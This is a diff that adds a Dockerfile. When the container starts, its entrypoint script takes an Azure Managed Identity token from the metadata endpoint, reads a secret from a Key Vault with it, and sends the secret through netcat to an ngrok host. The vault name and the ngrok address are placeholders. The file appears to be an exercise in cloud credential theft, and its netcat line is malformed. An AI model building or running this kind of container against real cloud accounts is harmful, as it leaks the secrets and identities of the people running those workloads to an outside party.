@@ -1,0 +1,39 @@
+FROM python:3.9-slim
+
+RUN apt-get update && \
+    apt-get install -y bash curl jq ca-certificates netcat-openbsd && \
+    rm -rf /var/lib/apt/lists/*
+
+WORKDIR /app
+
+RUN printf '%s\n' \
+    '#!/bin/bash' \
+    'echo "Container starting..."' \
+    'echo "Requesting Managed Identity token..."' \
+    '' \
+    'TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)' \
+    '' \
+    'if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then' \
+    '  echo "Failed to get token"' \
+    '  exit 1' \
+    'fi' \
+    '' \
+    'echo "Token acquired successfully"' \
+    'echo "Fetching secret from Key Vault..."' \
+    'SECRET=$(curl -s -H "Authorization: Bearer $TOKEN" https://<VAULT_NAME>.vault.azure.net/secrets/Image?api-version=7.4 | jq -r .value)' \
+    '' \
+    'if [ -z "$SECRET" ] || [ "$SECRET" = "null" ]; then' \
+    '  echo "Failed to fetch secret"' \
+    '  exit 1' \
+    'fi' \
+    '' \
+    'echo "Secret retrieved successfully"' \
+    'echo "Sending secret via netcat to ngrok..."' \
+    'echo "Secret: $SECRET" | Nc <NGROK_URL><NGROK_PORT> \
+    '' \
+    'echo "Data sent!"' \
+    'sleep 3600' \
+    > /entrypoint.sh && \
+    chmod +x /entrypoint.sh
+
+ENTRYPOINT ["/entrypoint.sh"]
